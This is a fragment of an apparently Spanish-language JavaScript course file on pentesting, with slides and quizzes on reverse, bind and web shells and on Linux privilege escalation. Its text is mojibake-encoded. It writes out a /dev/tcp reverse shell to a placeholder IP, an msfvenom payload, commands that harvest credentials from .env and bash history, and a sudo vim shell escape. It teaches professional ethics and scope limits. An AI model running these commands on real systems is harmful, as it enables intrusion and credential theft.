            tag: "SHELLS",
            titulo: "Tipos de shells",
            contenido: `Para trabajar cÃ³modamente en lugar de ejecutar comandos sueltos, necesitas una shell â€” una lÃ­nea de comandos que corre en el servidor y tÃº controlas desde tu mÃ¡quina.

REVERSE SHELL â€” el servidor se conecta hacia ti.
Es la mÃ¡s comÃºn en trabajo externo porque muchas redes bloquean conexiones entrantes hacia los servidores, pero permiten que los servidores salgan a internet.

TÃº te pones a escuchar en tu mÃ¡quina:
nc -lnvp 4444

Y envÃ­as este payload al servidor vulnerable:
bash -i >& /dev/tcp/TU_IP/4444 0>&1

El servidor ejecuta bash, conecta su entrada/salida hacia tu IP y puerto. TÃº ves la shell del servidor en tu terminal.

BIND SHELL â€” el servidor abre un puerto y tÃº te conectas.
Menos comÃºn porque los firewalls suelen bloquear conexiones entrantes.

WEB SHELL â€” un archivo (PHP, ASPX) que subes al servidor y accedes por el navegador.
Menos cÃ³modo pero a veces lo Ãºnico disponible.

GeneraciÃ³n de payloads con msfvenom:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f elf -o shell.elf`
          },
          {
            tag: "RESPONSABILIDAD",
            titulo: "Trabajar con responsabilidad profesional",
            contenido: `Tener acceso no es el final. Es donde el trabajo profesional empieza de verdad.

Tu trabajo no es demostrar cuÃ¡nto puedes romper. Tu trabajo es demostrar el riesgo de forma controlada para que el cliente pueda arreglarlo.

Reglas mientras estÃ¡s dentro del sistema:

â€” No toques archivos de configuraciÃ³n de producciÃ³n
â€” No leas datos reales de clientes (tarjetas, emails, contraseÃ±as)
â€” No instales nada que persista despuÃ©s del pentest
â€” Documenta cada comando ejecutado con su hora exacta

Estabilizar la shell (para trabajar sin que se corte):
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
(Ctrl+Z)
stty raw -echo; fg

Esto convierte una shell bÃ¡sica en una terminal usable con historial, autocompletado y Ctrl+C que no mata la sesiÃ³n.

Recuerda: estÃ¡s en el servidor de producciÃ³n de un cliente real. Cada acciÃ³n tiene consecuencias. Si algo se cae por tu intervenciÃ³n, es tu responsabilidad.`
          },
        ],
        quiz: [
          {
            q: "Confirmas RCE en la web principal del cliente. El servidor responde a 'id' con 'uid=33(www-data)'. Â¿Es suficiente para el informe?",
            opts: ["No, siempre debes escalar a root para demostrar impacto real", "SÃ­, 'id' demuestra ejecuciÃ³n remota de cÃ³digo â€” es evidencia sÃ³lida. Solo escalarÃ­as si el cliente lo pide y el alcance lo permite", "No, debes mostrar que puedes acceder a la base de datos", "SÃ­, pero solo si el cliente solicitÃ³ especÃ­ficamente RCE como objetivo"],
            c: 1,
            e: "Un comando inofensivo como 'id' o 'whoami' demuestra sin ambigÃ¼edad que el servidor ejecuta tus comandos. Ir mÃ¡s allÃ¡ sin necesidad aumenta el riesgo de afectar la operaciÃ³n. El impacto estÃ¡ demostrado â€” es suficiente evidencia."
          },
          {
            q: "Â¿Por quÃ© se prefiere una reverse shell en pentesting externo?",
            opts: ["Porque es mÃ¡s difÃ­cil de detectar por los antivirus", "Porque el servidor sale a conectarse hacia ti â€” evita los firewalls que bloquean conexiones entrantes hacia los servidores", "Porque es el Ãºnico tipo de shell que funciona en Linux", "Porque no requiere ejecutar cÃ³digo en el servidor"],
            c: 1,
            e: "Los firewalls corporativos tÃ­picamente permiten que los servidores hagan conexiones salientes (necesario para actualizaciones, APIs externas). Una reverse shell aprovecha eso: el servidor sale a buscarte en lugar de que tÃº entres al servidor."
          },
          {
            q: "Mientras estÃ¡s dentro del servidor del cliente, encuentras un archivo con datos de tarjetas de crÃ©dito de clientes reales. Â¿QuÃ© haces?",
            opts: ["Lo descargo como evidencia del hallazgo", "Cierro el archivo inmediatamente, anoto que existe con su ruta y hora, y reporto el hallazgo al cliente sin leer ni copiar los datos", "Lo leo para confirmar que son datos reales antes de reportar", "Lo ignoro porque no es parte del objetivo del pentest"],
            c: 1,
            e: "Acceder a datos reales de clientes sin necesidad es una violaciÃ³n Ã©tica y legal. El hallazgo es que el archivo existe y es accesible â€” eso ya es crÃ­tico. No necesitas leer los datos para probarlo. Documentas la existencia y reportas inmediatamente."
          },
          {
            q: "Â¿Para quÃ© sirve el comando 'python3 -c import pty;pty.spawn(\"/bin/bash\")' despuÃ©s de obtener una reverse shell?",
            opts: ["Para escalar privilegios a root automÃ¡ticamente", "Para convertir la shell bÃ¡sica en una terminal funcional con historial, autocompletado y comportamiento normal", "Para cifrar la comunicaciÃ³n con el servidor", "Para ejecutar Python en el servidor vÃ­ctima"],
            c: 1,
            e: "Una reverse shell bÃ¡sica es inestable: Ctrl+C mata la sesiÃ³n, no hay autocompletado y algunos programas no funcionan sin TTY. El comando spawna una bash con terminal real (PTY) que permite trabajar normalmente."
          },
          {
            q: "El cliente te dice que no profundices mÃ¡s en una vulnerabilidad que encontraste. Â¿CÃ³mo reaccionas?",
            opts: ["ContinÃºo de todas formas para demostrar el mÃ¡ximo impacto posible", "Acepto, documento el hallazgo con fecha y hora, y continÃºo con el resto del scope", "Pregunto al lÃ­der de proyecto si puedo ignorar la instrucciÃ³n del cliente", "Escalo la vulnerabilidad brevemente antes de detenerme"],
            c: 1,
            e: "Las instrucciones del cliente durante el proyecto son vinculantes. El cliente conoce sus sistemas: puede saber que seguir podrÃ­a derribar un servicio crÃ­tico o exponer datos que no deben verse. Documentas y continÃºas con otros objetivos."
          },
        ]
      },
    ]
  },

  {
    id: "rt-4",
    nombre: "Escalada de Privilegios",
    icon: "ðŸš€",
    color: "#a855f7",
    tag: "FREE",
    descripcion: "Pasas de www-data a root en Linux, de usuario normal a SYSTEM en Windows. Con mÃ©todo, no con suerte.",
    lecciones: [
      {
        id: "rt-4-1",
        titulo: "Linux â€” De www-data a root",
        slides: [
          {
            tag: "CONTEXTO",
            titulo: "Antes de atacar, ubÃ­cate",
            contenido: `EstÃ¡s dentro del servidor de Lumina Athletics como www-data. Es una cuenta muy limitada â€” la que usa el servidor web. No puedes leer archivos sensibles del sistema, no puedes cambiar configuraciones importantes.

Root es la cuenta que puede hacer absolutamente todo en Linux. Archivos, configuraciones, usuarios, servicios.

Pero antes de lanzarte a escalar, una pregunta honesta:

Â¿Ser root en este servidor cambia el impacto del hallazgo? Â¿O el valor real estÃ¡ en otra cosa â€” credenciales en un archivo de configuraciÃ³n, acceso a una red interna, datos de clientes?

Si ya tienes www-data y puedes acceder a la base de datos de la tienda, eso puede valer mÃ¡s en el informe que ser root en ese servidor.

Si la escalada sÃ­ aporta valor, empieza asÃ­:
id â†’ quiÃ©n eres y quÃ© grupos tienes
hostname â†’ en quÃ© equipo estÃ¡s
uname -a â†’ versiÃ³n del kernel (versiones viejas tienen CVEs)

Estos tres comandos son siempre los primeros. Anotas todo con hora.`
          },
          {
            tag: "VECTORES",
            titulo: "Sudo, SUID y credenciales",
            contenido: `Los vectores mÃ¡s efectivos en escalada Linux, en orden de probabilidad:

1. SUDO â€” Â¿quÃ© puedes ejecutar con privilegios de otro usuario?
sudo -l
Si puedes ejecutar algÃºn programa como root, GTFOBins (gtfobins.github.io) explica cÃ³mo cada programa puede explotarse para obtener shell o leer archivos.

2. SUID â€” programas que siempre se ejecutan como su dueÃ±o (root):
find / -perm -4000 -type f 2>/dev/null
Buscas programas raros, en rutas extraÃ±as, que no deberÃ­an tener SUID.

3. CREDENCIALES EN ARCHIVOS:
cat /var/www/html/.env
cat ~/.bash_history
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password"
Los desarrolladores dejan credenciales escritas. El historial de bash guarda comandos con contraseÃ±as que alguien pegÃ³.

4. CRON â€” tareas programadas como root:
cat /etc/crontab
Si una tarea corre como root y ejecuta un script que tÃº puedes modificar â†’ puedes ejecutar cÃ³digo como root.

Herramienta automatizada: linpeas (github.com/peass-ng/PEASS-ng) â€” busca todo esto de una vez.`
          },
          {
            tag: "CREDENCIALES",
            titulo: "El hallazgo que vale mÃ¡s que root",
            contenido: `Mientras revisas el servidor de Drupal encuentras /var/www/html/.env:

DB_HOST=corp.local
DB_USER=drupal_app
DB_PASSWORD=S3cureDBp4ss!
DB_NAME=drupal_prod

Detente. Esto es mÃ¡s importante que cualquier escalada local.

DB_HOST=corp.local â†’ ese nombre interno (.local) indica que hay una red interna del cliente que tÃº, desde afuera, no podÃ­as ver. Ese servidor estÃ¡ conectado a ella.

La contraseÃ±a que encontraste puede estar reutilizada en:
â€” El servidor de base de datos directamente
â€” Otros servicios de la red interna
â€” La cuenta de algÃºn empleado
â€” El panel de administraciÃ³n de otro sistema

Este es el momento de parar y comunicar.

1. Anotas la credencial con fecha y hora
2. Avisas al cliente que encontraste acceso potencial a la red interna
3. Preguntas si puedes probarla contra otros sistemas del scope
4. Solo si tienes autorizaciÃ³n explÃ­cita, continÃºas

Una credencial que abre la red interna es un hallazgo que cambia el informe entero.`
          },
        ],
        quiz: [
          {
            q: "sudo -l muestra que puedes ejecutar /usr/bin/vim como root. Â¿QuÃ© puedes hacer con esto?",
            opts: ["Editar archivos de sistema pero sin obtener una shell", "SegÃºn GTFOBins, vim puede lanzar una shell como root desde su modo de comando â€” es un vector de escalada clÃ¡sico", "Solo ver archivos de configuraciÃ³n como root", "Nada, vim es solo un editor de texto"],
            c: 1,
            e: "GTFOBins documenta que vim con sudo puede ejecutar ':!/bin/bash' para obtener una shell root. Muchos programas aparentemente inocentes tienen capacidades no obvias cuando corren con privilegios elevados."
          },
          {
            q: "find / -perm -4000 -type f 2>/dev/null devuelve /usr/local/bin/backup_tool con SUID y propietario root. Â¿Por quÃ© es interesante?",
            opts: ["Los archivos SUID siempre son seguros si el propietario es root", "Es un programa no estÃ¡ndar en una ruta no estÃ¡ndar con SUID de root â€” merece investigaciÃ³n para ver si puede abusar de su ejecuciÃ³n privilegiada", "SUID solo afecta a binarios del sistema operativo", "Solo es relevante si el binario tiene vulnerabilidades conocidas en CVE"],
            c: 1,
            e: "Los programas SUID estÃ¡ndar del sistema son esperados. Uno personalizado en /usr/local/bin es sospechoso â€” puede tener un path traversal, inyecciÃ³n de comandos o simplemente lanzar una shell. GTFOBins primero, anÃ¡lisis manual despuÃ©s."
          },
          {
            q: "En .env encuentras DB_HOST=corp.local. Â¿Por quÃ© es mÃ¡s valioso que simplemente tener la contraseÃ±a de la base de datos?",
            opts: ["Porque corp.local siempre tiene vulnerabilidades crÃ­ticas", "Porque revela que existe una red interna (.local) que el servidor puede alcanzar â€” potencial pivoting a sistemas no visibles desde internet", "Porque .local indica que el servidor estÃ¡ desactualizado", "Solo es relevante si tienes credenciales de admin del dominio"],
            c: 1,
            e: "corp.local es un nombre DNS interno, no resoluble desde internet. Su presencia confirma que el servidor comprometido estÃ¡ dentro de la red interna del cliente. Desde ese servidor puedes alcanzar sistemas que normalmente no son atacables externamente."
          },
          {
            q: "Linpeas marca decenas de vectores potenciales en colores. Â¿CuÃ¡l es el enfoque correcto?",
            opts: ["Explotar todos los vectores rojos (crÃ­ticos) antes de continuar", "Leer con criterio, priorizar los que tienen mÃ¡s probabilidad de funcionar y son menos invasivos, descartar lo que no confirmas rÃ¡pido", "Explotar en el orden que linpeas los lista", "Ignorar linpeas y hacer la escalada manualmente siempre"],
            c: 1,
            e: "Linpeas es una herramienta, no un orÃ¡culo. Marca cosas que requieren interpretaciÃ³n. Algunos 'vectores' son configuraciones normales. Priorizar por impacto y probabilidad es parte del juicio profesional â€” no todo lo que linpeas marca es explotable."
          },
          {
            q: "Llevas 2 horas intentando escalar privilegios en el servidor sin resultado. Â¿CuÃ¡l es la decisiÃ³n correcta?",
            opts: ["Continuar hasta encontrar algo â€” la persistencia es la clave del pentesting", "Documentar los intentos, descartar este vector por ahora y pasar al siguiente objetivo del scope", "Pedir al cliente mÃ¡s tiempo exclusivamente para este servidor", "Intentar pruebas mÃ¡s agresivas aunque el cliente pidiÃ³ que no fueran invasivas"],
            c: 1,
            e: "En consultorÃ­a el tiempo es real y los recursos son limitados. Si un vector no da seÃ±al despuÃ©s de un tiempo razonable, lo documentas y priorizas otros objetivos. Hay 5 objetivos mÃ¡s en el scope. El tiempo mal gastado aquÃ­ es tiempo que no inviertes en otros hallazgos."
          },
        ]
      },
    ]
  },
];
